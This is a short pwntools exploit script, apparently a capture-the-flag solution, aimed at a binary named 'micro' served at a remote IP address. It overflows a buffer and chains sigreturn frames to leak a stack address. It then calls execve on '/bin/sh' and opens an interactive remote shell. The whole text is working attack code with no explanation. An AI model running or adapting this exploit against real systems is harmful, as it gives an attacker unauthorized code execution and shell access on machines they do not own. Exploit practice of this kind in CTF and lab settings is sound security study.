from pwn import *

c = process("./micro")
c = remote("10.10.4.10", 8888)
context.arch = "amd64"
#c = remote("localhost", 4444)
write = 0x40100C
ret = 0x40102F
read = 0x401018
write_msg = 0x0401004
syscall = 0x40102D
payload = b'A'*0x20
payload += p64(write)
payload += p64(syscall)
frame = SigreturnFrame()
frame.rsi = 0x402510
frame.rdx = 0x1000
frame.rsp = 0x402510
frame.rip = syscall
frame.rbp = 0x402380+0x20
payload += bytes(frame)
#gdb.attach(c)
input()
c.sendline(payload)
input()
stack = u64(c.recv()[104:])
print(hex(stack))
c.sendline(b'A'*14)
input()
payload = p64(read)
payload += p64(syscall)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402618
frame.rip = syscall
payload += bytes(frame)
payload += b'A'*(0x100-len(payload)-0x10)
payload += b'/bin/sh\x00'
c.sendline(payload)
print("last read")
input()
c.sendline(b'G'*14)
c.interactive()
